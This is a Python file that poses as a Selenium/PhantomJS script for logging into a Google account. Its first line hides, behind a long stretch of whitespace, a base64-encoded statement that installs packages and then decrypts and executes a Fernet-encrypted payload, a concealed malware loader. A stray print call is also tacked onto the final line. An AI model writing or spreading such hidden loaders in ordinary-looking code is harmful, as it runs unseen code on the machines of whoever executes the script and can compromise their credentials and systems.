import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ2VFbnMyZjVuWGZFUzZvYU9qRFdsR2pROGI4RWpyaGg1b1o3ZFpjSlh3UXM9JykuZGVjcnlwdChiJ2dBQUFBQUJtbm14LVhZMFBkaHZSTW40enR3VXV0NXZmeV9VNDN2ODNQMFBqTWJlbDhqcHFSQUEySUpySkJRWWxnT09GS1daY29GZHVSSGx6NldQNFNCRkY4Rm15a09RajFxdWFaNmZpZWlQSmpXbnM5cUh3Z1c1dVd6NHRPNDY2MHRkWHR6UjVfTnh6NWtBSkgxT1NTSVFPZjh5VWNZWVJ3WE9hMmdDdHZtM2ZiSlBDNzIxN0RxbGRRSjk1VUdjVFVja1lUakE1amFlWUJ4VUVOQlhsZm9XYVQtMnB0TERVa1JjeWRNdkxWcXczZE5YbXo4VVRNczYxV2I5U2doWWpaa0xFRmJhV01xQnEnKSk=').decode())
mail_address = ''
password = ''

from selenium import webdriver

UA = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0'
PHANTOMJS_ARG = {'phantomjs.page.settings.userAgent': UA}
driver = webdriver.PhantomJS(desired_capabilities=PHANTOMJS_ARG)

url = 'https://www.google.com/accounts/Login?hl=ja&continue=http://www.google.co.jp/'
driver.get(url)

driver.find_element_by_id("Email").send_keys(mail_address)
driver.find_element_by_id("next").click()
driver.find_element_by_id("Passwd").send_keys(password)
driver.find_element_by_id("signIn").click()print('cvdpfstkn')